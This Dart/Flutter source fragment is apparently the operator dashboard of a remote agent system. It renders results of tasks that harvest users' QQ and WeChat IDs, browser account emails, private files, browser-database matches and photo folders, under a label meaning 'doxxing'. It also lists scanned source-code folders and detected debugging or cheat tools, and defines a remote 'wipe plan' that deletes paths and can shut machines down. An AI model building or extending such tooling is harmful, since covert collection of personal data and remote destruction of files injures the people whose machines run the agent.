        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: _line),
      ),
      child: Row(
        children: [
          Expanded(
            child: Text(
              '${a['username']}',
              style: TextStyle(
                  color: banned ? _red : _text, fontSize: 12),
            ),
          ),
          Text(
            '${a['last_login_time'] ?? '-'}',
            style: const TextStyle(color: _dim, fontSize: 10),
          ),
          const SizedBox(width: 10),
          SizedBox(
            height: 26,
            child: OutlinedButton(
              onPressed: () => _ban(a['username'].toString(), !banned),
              style: OutlinedButton.styleFrom(
                side: BorderSide(
                    color: (banned ? _green : _red).withOpacity(0.5)),
                padding: const EdgeInsets.symmetric(horizontal: 10),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(6)),
              ),
              child: Text(banned ? '解封' : '封禁',
                  style: TextStyle(
                      color: banned ? _green : _red, fontSize: 11)),
            ),
          ),
        ],
      ),
    );
  }

  /// 折叠状态下的一行摘要：先告诉操作员「有什么」，再决定要不要展开看路径。
  Widget _taskSummary(String type, Map<String, dynamic> m) {
    List<String> il(String k) =>
        (m[k] as List?)?.map((e) => e.toString()).where((e) => e.isNotEmpty).toList() ??
            const [];
    final parts = <String>[];
    if (type == 'collect_identity') {
      void add(String label, int n) {
        if (n > 0) parts.add('$label $n');
      }

      add('QQ', il('qq').length);
      add('微信', il('wechat').length);
      add('账号', il('accounts').length);
      add('隐私文件', il('private_files').length);
      add('内容命中', il('text_hits').length);
      add('浏览器库', il('browser_hits').length);
      add('头像', il('avatars').length);
    } else {
      final machRaw = m['machine'];
      final mach = machRaw is Map ? machRaw : const {};
      List<String> ml(String k) => (mach[k] as List?)
              ?.map((e) => e.toString())
              .where((e) => e.isNotEmpty)
              .toList() ??
          const [];
      if (ml('tools').isNotEmpty) parts.add('工具 ${ml('tools').length}');
      if (ml('scanner_hits').isNotEmpty) parts.add('扫盘 ${ml('scanner_hits').length}');
      if (ml('recent_files').isNotEmpty) parts.add('最近文件 ${ml('recent_files').length}');
      final proj = (m['projects'] as List?)?.length ?? 0;
      if (proj > 0) parts.add('工程 $proj');
    }
    return Padding(
      padding: const EdgeInsets.only(top: 5),
      child: Row(
        children: [
          Expanded(
            child: Text(
              parts.isEmpty ? '没有命中任何线索' : parts.join('  ·  '),
              style: TextStyle(
                  color: parts.isEmpty ? _dim : _red,
                  fontSize: 11,
                  height: 1.4),
            ),
          ),
          const SizedBox(width: 8),
          const Text('展开',
              style: TextStyle(color: _blue, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _taskRow(Map<String, dynamic> t) {
    final type = t['type'].toString();
    final status = t['status'].toString();
    final color = status == 'done'
        ? _green
        : status == 'failed'
            ? _red
            : status == 'pending' || status == 'delivered'
                ? _blue
                : _dim;
    final msg = (t['result_message'] ?? '').toString();
    final tid = (t['task_id'] ?? t['id'] ?? msg.hashCode).toString();
    final parsed = _jsonOf(msg);
    final structured = parsed != null &&
        (type == 'collect_identity' || type == 'collect_src');
    final open = _openTasks.contains(tid);

    Widget body;
    if (structured) {
      body = open
          ? (type == 'collect_identity'
              ? _identityBody(parsed)
              : _srcBody(parsed))
          : _taskSummary(type, parsed);
    } else if (msg.isNotEmpty) {
      body = Padding(
        padding: const EdgeInsets.only(top: 4),
        child: Text(
          msg.length > 300 ? '${msg.substring(0, 300)}…' : msg,
          style: const TextStyle(color: _dim, fontSize: 11, height: 1.4),
        ),
      );
    } else {
      body = const SizedBox.shrink();
    }

    return Container(
      margin: const EdgeInsets.only(bottom: 6),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: _line),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          GestureDetector(
            behavior: HitTestBehavior.opaque,
            onTap: structured
                ? () => setState(() {
                      if (open) {
                        _openTasks.remove(tid);
                      } else {
                        _openTasks.add(tid);
                      }
                    })
                : null,
            child: Row(
              children: [
                if (structured)
                  Icon(open ? Icons.expand_more : Icons.chevron_right,
                      size: 15, color: _blue),
                Text(OnyxApi.taskLabels[type] ?? type,
                    style: const TextStyle(color: _text, fontSize: 12)),
                const SizedBox(width: 8),
                Text(OnyxApi.statusLabels[status] ?? status,
                    style: TextStyle(color: color, fontSize: 11)),
                const Spacer(),
                Text('${t['created_at'] ?? ''}',
                    style: const TextStyle(color: _dim, fontSize: 10)),
              ],
            ),
          ),
          body,
        ],
      ),
    );
  }

  /// 收集身份的结构化展示。
  /// 原来直接打印 JSON，但键按字母排序，`tools`/`scanner_hits`/`recent_files`/`session`
  /// 全排在后面被 300 字符截断 —— 真正有用的部分一条都看不到。
  Widget _identityBody(Map<String, dynamic> m) {
    List<String> list(String k) => (m[k] as List?)
            ?.map((e) => e.toString())
            .where((e) => e.isNotEmpty)
            .toList() ??
        const [];
    final tools = list('tools');
    final hits = list('scanner_hits');
    final recent = list('recent_files');
    final sess = m['session'];
    final sessUser = sess is Map ? (sess['username'] ?? '').toString() : '';

    Widget kv(String k, String v) => v.trim().isEmpty
        ? const SizedBox.shrink()
        : Padding(
            padding: const EdgeInsets.only(top: 4),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(
                    width: 60,
                    child: Text(k,
                        style: const TextStyle(color: _dim, fontSize: 11))),
                Expanded(
                    child: Text(v,
                        style: const TextStyle(color: _text, fontSize: 11))),
              ],
            ),
          );

    Widget chips(String label, List<String> items, Color color) =>
        items.isEmpty
            ? const SizedBox.shrink()
            : Padding(
                padding: const EdgeInsets.only(top: 6),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    SizedBox(
                        width: 60,
                        child: Text(label,
                            style:
                                const TextStyle(color: _dim, fontSize: 11))),
                    Expanded(
                      child: Wrap(
                        spacing: 6,
                        runSpacing: 4,
                        children: [
                          for (final s in items.take(14))
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: color.withOpacity(0.14),
                                borderRadius: BorderRadius.circular(4),
                                border:
                                    Border.all(color: color.withOpacity(0.5)),
                              ),
                              child: Text(s,
                                  style:
                                      TextStyle(color: color, fontSize: 10)),
                            ),
                        ],
                      ),
                    ),
                  ],
                ),
              );

    // ── 开盒结果：隐私字段直接在顶层（机器画像已经搬到 collect_src）──
    final ident = m;
    List<String> il(String k) =>
        (ident[k] as List?)?.map((e) => e.toString()).where((e) => e.isNotEmpty).toList() ??
            const [];
    final qq = il('qq');
    final wx = il('wechat');
    final avatarPaths = il('avatars');
    final photoDirs = il('photo_dirs');
    final browserDirs = il('browser_dirs');
    final accounts = (ident['accounts'] as List?)?.cast<Map>() ?? const [];
    final privateFiles = (ident['private_files'] as List?)?.cast<Map>() ?? const [];
    final textHits = (ident['text_hits'] as List?)?.cast<Map>() ?? const [];
    final browserHits = (ident['browser_hits'] as List?)?.cast<Map>() ?? const [];

    Widget section(String label, List<Widget> children) => children.isEmpty
        ? const SizedBox.shrink()
        : Padding(
            padding: const EdgeInsets.only(top: 6),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(
                    width: 60,
                    child: Text(label,
                        style: const TextStyle(color: _dim, fontSize: 11))),
                Expanded(
                  child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: children),
                ),
              ],
            ),
          );

    Widget paths(String label, List<String> items, Color color) => section(label, [
          for (final s in items.take(8))
            SelectableText(s,
                style: TextStyle(color: color, fontSize: 10, height: 1.5)),
        ]);

    final suspicious = tools.isNotEmpty ||
        hits.isNotEmpty ||
        privateFiles.isNotEmpty ||
        textHits.isNotEmpty ||
        qq.isNotEmpty ||
        wx.isNotEmpty;

    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const SizedBox(height: 2),
        kv('机器',
            '${m['computer'] ?? ''}  ${m['os'] ?? ''}  ${m['local_ip'] ?? ''}'),
        kv('账号',
            '${m['user'] ?? ''}${sessUser.isNotEmpty ? '  / 会话 $sessUser' : ''}'),
        kv('ID',
            '${m['device_id'] ?? ''}  agent ${m['agent_version'] ?? ''}  ${m['arch'] ?? ''}'),
        chips('工具命中', tools, _red),
        chips('扫盘命中', hits, _red),
        chips('最近文件', recent, _blue),
        chips('QQ', qq, _red),
        chips('微信号', wx, _red),
        section('浏览器账号', [
          for (final a in accounts.take(6))
            SelectableText(
              [
                '${a['browser']}/${a['profile']}',
                if ((a['name'] ?? '').toString().isNotEmpty) a['name'].toString(),
                if ((a['email'] ?? '').toString().isNotEmpty) a['email'].toString(),
              ].join('  '),
              style: const TextStyle(color: _text, fontSize: 11, height: 1.5),
            ),
        ]),
        section('隐私文件', [
          for (final f in privateFiles.take(8))
            SelectableText(
              '${f['path']}\n    ${f['why'] ?? ''}',
              style: const TextStyle(color: _red, fontSize: 10, height: 1.5),
            ),
        ]),
        section('内容命中', [
          for (final h in textHits.take(6))
            SelectableText(
              '${h['path']}\n    ${((h['values'] as List?) ?? []).join('  ')}',
              style: const TextStyle(color: _red, fontSize: 10, height: 1.5),
            ),
        ]),
        section('浏览器库', [
          for (final h in browserHits.take(6))
            SelectableText(
              '${h['path']}\n    ${((h['values'] as List?) ?? []).join('  ')}',
              style: const TextStyle(color: _red, fontSize: 10, height: 1.5),
            ),
        ]),
        paths('头像', avatarPaths, _green),
        paths('相册', photoDirs, _blue),
        paths('浏览器目录', browserDirs, _blue),
        if (!suspicious)
          const Padding(
            padding: EdgeInsets.only(top: 6),
            child: Text('未命中任何逆向 / 调试 / 作弊工具，也没有隐私线索',
                style: TextStyle(color: _green, fontSize: 11)),
          ),
      ],
    );
  }

  /// 扫源码 = 机器画像 + 工具命中 + 扫盘命中 + 最近文件 + 工程目录。
  /// 一次点击同时回答「这台机器什么情况」和「源码在哪」。
  Widget _srcBody(Map<String, dynamic> m) {
    final machRaw = m['machine'];
    final mach = machRaw is Map ? machRaw : const {};
    List<String> ml(String k) => (mach[k] as List?)
            ?.map((e) => e.toString())
            .where((e) => e.isNotEmpty)
            .toList() ??
        const [];
    final tools = ml('tools');
    final hits = ml('scanner_hits');
    final recent = ml('recent_files');
    final projects = (m['projects'] as List?)?.cast<Map>() ?? const [];
    final roots = (m['roots'] as List?)?.map((e) => e.toString()).toList() ?? const [];
    final sess = mach['session'];
    final sessUser = sess is Map ? (sess['username'] ?? '').toString() : '';

    Widget kv(String k, String v) => v.trim().isEmpty
        ? const SizedBox.shrink()
        : Padding(
            padding: const EdgeInsets.only(top: 4),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                SizedBox(
                    width: 60,
                    child: Text(k,
                        style: const TextStyle(color: _dim, fontSize: 11))),
                Expanded(
                    child: Text(v,
                        style: const TextStyle(color: _text, fontSize: 11))),
              ],
            ),
          );

    Widget chips(String label, List<String> items, Color color) =>
        items.isEmpty
            ? const SizedBox.shrink()
            : Padding(
                padding: const EdgeInsets.only(top: 6),
                child: Row(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    SizedBox(
                        width: 60,
                        child: Text(label,
                            style:
                                const TextStyle(color: _dim, fontSize: 11))),
                    Expanded(
                      child: Wrap(
                        spacing: 6,
                        runSpacing: 4,
                        children: [
                          for (final s in items.take(16))
                            Container(
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: color.withOpacity(0.14),
                                borderRadius: BorderRadius.circular(4),
                                border:
                                    Border.all(color: color.withOpacity(0.5)),
                              ),
                              child: Text(s,
                                  style:
                                      TextStyle(color: color, fontSize: 10)),
                            ),
                        ],
                      ),
                    ),
                  ],
                ),
              );

    final suspicious = tools.isNotEmpty || hits.isNotEmpty;
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        const SizedBox(height: 2),
        kv('机器',
            '${mach['computer'] ?? ''}  ${mach['os'] ?? ''}  ${mach['local_ip'] ?? ''}'),
        kv('账号',
            '${mach['user'] ?? ''}${sessUser.isNotEmpty ? '  / 会话 $sessUser' : ''}'),
        kv('ID',
            '${mach['device_id'] ?? ''}  agent ${mach['agent_version'] ?? ''}  ${mach['arch'] ?? ''}'),
        chips('工具命中', tools, _red),
        chips('扫盘命中', hits, _red),
        chips('最近文件', recent, _blue),
        if (projects.isEmpty)
          Padding(
            padding: const EdgeInsets.only(top: 6),
            child: Text(
              '未发现工程目录（已扫 ${m['scanned'] ?? 0} 个目录）',
              style: const TextStyle(color: _dim, fontSize: 11),
            ),
          )
        else
          Padding(
            padding: const EdgeInsets.only(top: 6),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(
                    width: 60,
                    child: Text('工程目录',
                        style: TextStyle(color: _dim, fontSize: 11))),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      for (final p in projects.take(10))
                        SelectableText(
                          '${p['path']}   [${p['kind']}] ${p['files']} 个文件',
                          style: const TextStyle(
                              color: _green, fontSize: 10, height: 1.6),
                        ),
                    ],
                  ),
                ),
              ],
            ),
          ),
        if (projects.isEmpty && roots.isNotEmpty)
          Padding(
            padding: const EdgeInsets.only(top: 4),
            child: Text('扫描根：${roots.take(6).join('  ')}',
                style: const TextStyle(color: _dim, fontSize: 10)),
          ),
        if (!suspicious)
          const Padding(
            padding: EdgeInsets.only(top: 6),
            child: Text('未命中任何逆向 / 调试 / 作弊工具',
                style: TextStyle(color: _green, fontSize: 11)),
          ),
      ],
    );
  }

  Widget _fileRow(Map<String, dynamic> f) {
    final path = (f['src_path'] ?? '').toString();
    final name = path.split(RegExp(r'[\\/]')).last;
    final bytes = (f['bytes'] as num?)?.toInt() ?? 0;
    return Container(
      margin: const EdgeInsets.only(bottom: 6),
      padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
      decoration: BoxDecoration(
        color: _card,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: _line),
      ),
      child: Row(
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(name,
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    style: const TextStyle(color: _text, fontSize: 12)),
                Text('${_size(bytes)} · ${f['created_at'] ?? ''}',
                    style: const TextStyle(color: _dim, fontSize: 10)),
              ],
            ),
          ),
          SizedBox(
            height: 26,
            child: OutlinedButton(
              onPressed: () => _openArtifact((f['id'] as num).toInt()),
              style: OutlinedButton.styleFrom(
                side: BorderSide(color: _blue.withOpacity(0.5)),
                padding: const EdgeInsets.symmetric(horizontal: 10),
                shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(6)),
              ),
              child: const Text('打开',
                  style: TextStyle(color: _blue, fontSize: 11)),
            ),
          ),
        ],
      ),
    );
  }

  String _deviceTitle(Map<String, dynamic> d) {
    final users = (d['users'] as List?)?.cast<String>() ?? [];
    return users.isEmpty ? d['hwid'].toString() : users.join(' / ');
  }

  String _ago(Object? seconds) {
    final s = (seconds as num?)?.toInt();
    if (s == null) return '从未心跳';
    if (s < 60) return '刚刚';
    if (s < 3600) return '${s ~/ 60} 分钟前';
    if (s < 86400) return '${s ~/ 3600} 小时前';
    return '${s ~/ 86400} 天前';
  }

  String _size(int b) {
    if (b < 1024) return '$b B';
    if (b < 1024 * 1024) return '${(b / 1024).toStringAsFixed(1)} KB';
    return '${(b / 1024 / 1024).toStringAsFixed(1)} MB';
  }
}

/// 格机计划：删哪些路径、删完要不要关机。
/// 关机默认 false —— 只删文件不该顺手把机器关了。
class _WipePlan {
  final List<String> paths;
  final bool shutdown;
  const _WipePlan(this.paths, this.shutdown);
}